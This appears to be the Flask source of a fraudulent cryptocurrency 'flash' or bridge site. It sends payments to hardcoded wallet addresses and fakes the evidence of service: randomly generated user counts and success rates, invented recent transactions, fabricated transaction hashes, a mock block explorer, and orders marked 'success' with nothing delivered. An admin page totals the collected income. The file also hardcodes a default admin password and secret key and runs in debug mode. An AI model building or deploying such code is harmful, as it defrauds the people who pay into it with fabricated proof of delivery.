import os
import random
import string
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from database import Database

app = Flask(__name__, static_folder='static', static_url_path='/static')
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "silverback-super-secret-key")
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

db = Database()

WALLETS = {
    "BTC": {
        "address": "bc1q5vyek2r3hzlarvgf4ycqmqf42tv398ns89u7ep",
        "network": "Bitcoin",
        "explorer": "https://blockchair.com/bitcoin/transaction/"
    },
    "ETH": {
        "address": "0x0844B1074FA252E8f71971203D175bDC5dbb6251",
        "network": "Ethereum (ERC-20)",
        "explorer": "https://etherscan.io/tx/"
    },
    "LTC": {
        "address": "ltc1qahueh8eyg79cqqkn253v2lhnef2ntvkwj4npuz",
        "network": "Litecoin",
        "explorer": "https://blockchair.com/litecoin/transaction/"
    },
    "USDT": {
        "address": "0x0844B1074FA252E8f71971203D175bDC5dbb6251",
        "network": "Ethereum (ERC-20)",
        "explorer": "https://etherscan.io/tx/"
    }
}

ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "Silverback2026")
TELEGRAM_BOT_URL = os.environ.get("TELEGRAM_BOT_URL", "https://t.me/SilverFlasher_bot")
RECEIVE_RATES = {
    "BTC": 43000.0,
    "ETH": 2550.0,
    "LTC": 70.0,
    "USDT": 1.0
}
FEE_RATES = {
    "BTC": 0.005,
    "ETH": 0.004,
    "LTC": 0.003,
    "USDT": 0.0015
}


def generate_payment_id(length: int = 12) -> str:
    return "PAY-" + "".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))


def calculate_receive_amount(amount_usd: float, currency: str) -> tuple[float, float]:
    fee_rate = FEE_RATES.get(currency, 0.003)
    fee_usd = max(0.5, amount_usd * fee_rate)
    crypto_rate = RECEIVE_RATES.get(currency, 1.0)
    receive_amount = round(max(0.0, amount_usd - fee_usd) / crypto_rate, 8)
    return receive_amount, round(fee_usd, 2)

def generate_fake_tx_hash() -> str:
    return "0x" + "".join(random.choice("0123456789abcdef") for _ in range(64))

@app.template_filter('number_format')
def number_format(value):
    try:
        return f"{int(value):,}"
    except Exception:
        return value

def get_stats():
    total_orders = len(db.fetchall("SELECT id FROM orders"))
    total_value = sum([row[0] for row in db.fetchall("SELECT amount FROM orders")]) if total_orders else 0
    return {
        "total_bridged": max(12450, int(total_value)),
        "active_users": random.randint(320, 1020),
        "success_rate": random.randint(92, 99),
        "recent_transactions": [
            {"name": "AveryX", "crypto": "BTC", "amount": "$1,200", "status": "Completed"},
            {"name": "ZephyrSwap", "crypto": "ETH", "amount": "$5,000", "status": "Completed"},
            {"name": "NovaBridge", "crypto": "USDT", "amount": "$2,400", "status": "Confirmed"},
            {"name": "Luna_Vault", "crypto": "LTC", "amount": "$760", "status": "Completed"}
        ]
    }

@app.route("/")
def index():
    stats = get_stats()
    return render_template("index.html", stats=stats, year=datetime.utcnow().year)

@app.route("/bridge")
def bridge():
    stats = get_stats()
    return render_template("bridge.html", stats=stats, wallets=WALLETS)

@app.route("/initiate-payment", methods=["POST"])
def initiate_payment():
    data = request.json or {}
    amount = float(data.get("amount", 0))
    currency = data.get("currency")
    wallet = WALLETS.get(currency)

    if not wallet or amount <= 0:
        return jsonify({"success": False, "message": "Invalid payment request."}), 400

    user_session = session.get("user_id") or str(datetime.utcnow().timestamp())
    session["user_id"] = user_session
    payment_id = generate_payment_id()
    receive_amount, fee_usd = calculate_receive_amount(amount, currency)
    db.create_order(payment_id, user_session, amount, currency, wallet["address"])

    return jsonify({
        "success": True,
        "payment_id": payment_id,
        "wallet_address": wallet["address"],
        "network": wallet["network"],
        "explorer": wallet["explorer"],
        "amount_usd": amount,
        "currency": currency,
        "receive_amount": f"{receive_amount} {currency}",
        "fee_usd": fee_usd,
        "expected_fee": f"${fee_usd:.2f}",
        "crypto_rate": RECEIVE_RATES.get(currency, 1.0)
    })

@app.route("/confirm-payment", methods=["POST"])
def confirm_payment():
    data = request.json or {}
    payment_id = data.get("payment_id")
    tx_hash = data.get("tx_hash")

    if not payment_id or not tx_hash:
        return jsonify({"success": False, "message": "Missing payment details."}), 400

    order = db.fetchone("SELECT * FROM orders WHERE payment_id = ?", (payment_id,))
    if not order:
        return jsonify({"success": False, "message": "Order not found."}), 404

    fake_order_id = order[0]
    db.update_order(payment_id, tx_hash, "processing")

    return jsonify({"success": True, "order_id": fake_order_id, "payment_id": payment_id})

@app.route("/flash-status/<payment_id>")
def flash_status(payment_id):
    order = db.fetchone("SELECT * FROM orders WHERE payment_id = ?", (payment_id,))
    if not order:
        return jsonify({"success": False, "message": "Order not found."}), 404

    status = order[7]
    if status == "processing":
        status = "success"
        db.update_order(payment_id, order[6], "success")

    return jsonify({
        "success": True,
        "status": status,
        "tx_hash": order[6] or generate_fake_tx_hash(),
        "explorer": WALLETS.get(order[3], {}).get("explorer")
    })

@app.route("/mock-explorer/<tx_hash>")
def mock_explorer(tx_hash):
    return render_template("mock_explorer.html", tx_hash=tx_hash)

@app.route("/processing")
def processing():
    return render_template("processing.html")

@app.route("/success")
def success():
    return render_template("success.html")

@app.route("/admin", methods=["GET", "POST"])
def admin():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if username == ADMIN_USER and password == ADMIN_PASS:
            session["admin_authenticated"] = True
            return redirect(url_for("admin_orders"))

    return render_template("admin.html", authenticated=session.get("admin_authenticated", False))

@app.route("/admin/orders")
def admin_orders():
    if not session.get("admin_authenticated"):
        return redirect(url_for("admin"))

    orders = db.get_all_orders()
    total_income = sum(order[3] for order in orders)

    return render_template("admin_orders.html", orders=orders, total_income=total_income)

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("admin"))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=True)
